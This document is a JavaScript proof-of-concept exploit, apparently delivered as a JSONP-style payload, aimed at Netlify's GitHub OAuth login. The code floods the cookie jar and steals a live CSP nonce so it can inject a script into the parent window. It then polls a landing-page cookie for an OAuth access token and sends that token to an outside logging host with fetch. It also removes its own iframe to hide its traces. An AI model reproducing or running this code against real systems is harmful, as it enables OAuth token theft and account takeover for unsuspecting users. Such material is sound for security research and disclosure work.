/**/
(() => {
  try {
    // --- cookie toss first (fills the real jar) ---
    const attrs = "Path=/";
    let prev = -1;
    for (let i = 0; i < 400; i++) {
      document.cookie = `junk${i}=${"A".repeat(32)}; ${attrs}`;
      const visible = document.cookie ? document.cookie.split(/; */).length : 0;
      if (visible === prev) break;
      prev = visible;
    }

    // --- steal a live CSP nonce so the injected script actually runs ---
    function getNonce() {
      var d = parent.document, s;
      try { s = d.querySelector("script[nonce]"); if (s && s.nonce) return s.nonce; } catch (e) {}
      try { for (var i = 0; i < d.scripts.length; i++) if (d.scripts[i].nonce) return d.scripts[i].nonce; } catch (e) {}
      try { var a = d.querySelectorAll("*[nonce]"); for (var j = 0; j < a.length; j++) if (a[j].nonce) return a[j].nonce; } catch (e) {}
      return "";
    }

    const d = parent.document;
    const installer = d.createElement("script");
    const nonce = getNonce();
    if (nonce) installer.nonce = nonce;

    function parentPayload() {
      const PANEL_ID = "oauth-parent-poc";

      const OAUTH_URL =
        "https://api.netlify.com/auth" +
        "?provider=github" +
        "&site_id=app.netlify.com" +
        "&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09" +
        "&login=true" +
        "&entry_point=direct" +
        "&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f" +
        "&device_fingerprint=bbbac72e6221cf088819fff54ca43b40" +
        "&redirect=" +
        encodeURIComponent("https://www.netlify.com/") +
        "&use_redirect=true";

      if (window.__oauthParentPoc?.destroy) {
        window.__oauthParentPoc.destroy();
      }

      let timer = null;
      let attempts = 0;
      let baselineCookie = "";
      let sent = false;

      function readOAuthProof() {
        const match = document.cookie.match(
          /(?:^|;\s*)_initial_landing_page=([^;]*)/
        );
        if (!match) {
          return { cookieReadable: false, cookieValue: "", tokenReadable: false };
        }

        let cookieValue = match[1];
        try { cookieValue = decodeURIComponent(cookieValue); } catch {}

        const tokenMatch = cookieValue.match(/(?:^|[?#&])access_token=([^&#]+)/);
        if (!tokenMatch) {
          return { cookieReadable: true, cookieValue, tokenReadable: false };
        }

        const token = tokenMatch[1];

        // exfil exactly once, well-formed param
        if (!sent) {
          sent = true;
          fetch("https://http-log-collector.netlify.app/api/log?token=" + encodeURIComponent(token));
        }

        return {
          cookieReadable: true,
          cookieValue,
          tokenReadable: true,
          tokenLength: token.length,
          redactedToken: token.length > 8 ? token.slice(0, 4) + "…" + token.slice(-4) : "[readable]"
        };
      }

      document.getElementById(PANEL_ID)?.remove();

      const panel = document.createElement("div");
      panel.id = PANEL_ID;
      panel.style.cssText = [
        "position:fixed","inset:0","z-index:2147483647","display:flex",
        "flex-direction:column","align-items:center","justify-content:center",
        "gap:20px","padding:30px","box-sizing:border-box","background:white",
        "color:#111","font-family:system-ui,sans-serif","text-align:center"
      ].join(";");

      const title = document.createElement("h1");
      title.textContent = "Parent-window OAuth PoC";

      const status = document.createElement("pre");
      status.style.cssText = [
        "min-width:500px","padding:20px","border-radius:10px","background:#eee",
        "font:18px monospace","line-height:1.5","white-space:pre-wrap"
      ].join(";");

      const oauthButton = document.createElement("button");
      oauthButton.textContent = "Continue with GitHub";
      oauthButton.style.cssText = ["padding:16px 28px","font-size:24px","cursor:pointer"].join(";");

      const closeButton = document.createElement("button");
      closeButton.textContent = "Close PoC";
      closeButton.style.cssText = ["padding:10px 18px","font-size:16px","cursor:pointer"].join(";");

      function showInitialState() {
        const proof = readOAuthProof();
        status.textContent =
          "Executing in top window: " + (window === top) +
          "\nCookie readable: " + proof.cookieReadable +
          "\nToken readable: " + proof.tokenReadable;
      }

      function inspectAfterOAuth() {
        attempts++;
        try {
          const proof = readOAuthProof();
          const changed = Boolean(proof.cookieValue) && proof.cookieValue !== baselineCookie;

          status.textContent =
            "Executing in top window: " + (window === top) +
            "\nAttempt: " + attempts +
            "\nCookie readable: " + proof.cookieReadable +
            "\nToken readable: " + proof.tokenReadable;

          if (proof.tokenReadable) {
            if (timer !== null) { window.clearTimeout(timer); timer = null; }
            status.textContent +=
              "\nToken length: " + proof.tokenLength +
              "\nRedacted token: " + proof.redactedToken +
              "\n\nOAuth-token readability confirmed.";
            status.style.background = "#c8f7c5";
            oauthButton.textContent = "OAuth-token readability confirmed";
            document.documentElement.setAttribute("data-oauth-token-readable", "true");
            window.__oauthParentPoc.result = proof;
            return;
          }
        } catch (error) {
          status.textContent = "Cookie inspection error: " + error.message;
        }
        if (attempts < 120) {
          timer = window.setTimeout(inspectAfterOAuth, 1000);
        } else {
          status.textContent += "\n\nTimed out after 120 attempts.";
        }
      }

      oauthButton.addEventListener("click", function () {
        const initial = readOAuthProof();
        baselineCookie = initial.cookieValue;
        attempts = 0;
        document.documentElement.setAttribute("data-oauth-clicked", "true");
        status.style.background = "#fff3cd";
        status.textContent = "OAuth opened.\nWaiting for cookie state…";
        window.open(OAUTH_URL, "_blank", "noopener");
        if (timer !== null) { window.clearTimeout(timer); }
        timer = window.setTimeout(inspectAfterOAuth, 1000);
      });

      closeButton.addEventListener("click", function () {
        window.__oauthParentPoc.destroy();
      });

      panel.append(title, status, oauthButton, closeButton);

      function mount() {
        document.body.appendChild(panel);
        window.__oauthParentPoc = {
          installed: true,
          result: null,
          inspect: readOAuthProof,
          destroy() {
            if (timer !== null) { window.clearTimeout(timer); }
            document.getElementById(PANEL_ID)?.remove();
            document.documentElement.removeAttribute("data-parent-poc-installed");
            document.documentElement.removeAttribute("data-oauth-clicked");
            document.documentElement.removeAttribute("data-oauth-token-readable");
            delete window.__oauthParentPoc;
          }
        };
        document.documentElement.setAttribute("data-parent-poc-installed", "true");
        // WAIT ~6s before reading any cookie (let the toss settle + OAuth cookie appear)
        setTimeout(showInitialState, 6000);
      }

      if (document.body) {
        mount();
      } else {
        document.addEventListener("DOMContentLoaded", mount, { once: true });
      }
    }

    installer.textContent = "(" + parentPayload.toString() + ")();";
    (d.head || d.documentElement).appendChild(installer);
    installer.remove();

    let attempts = 0;
    function cleanupWhenReady() {
      attempts++;
      try {
        const ready = d.documentElement.hasAttribute("data-parent-poc-installed");
        if (ready) {
          const frame = window.frameElement;
          if (frame) frame.remove();
          return;
        }
      } catch (error) {
        console.error("Parent readiness check failed:", error);
        return;
      }
      if (attempts < 100) {
        window.setTimeout(cleanupWhenReady, 100);
      } else {
        console.error("Parent PoC installation timed out");
      }
    }
    cleanupWhenReady();
  } catch (error) {
    console.error("Parent OAuth PoC failed:", error);
  }
})();
//({"counts":{}})
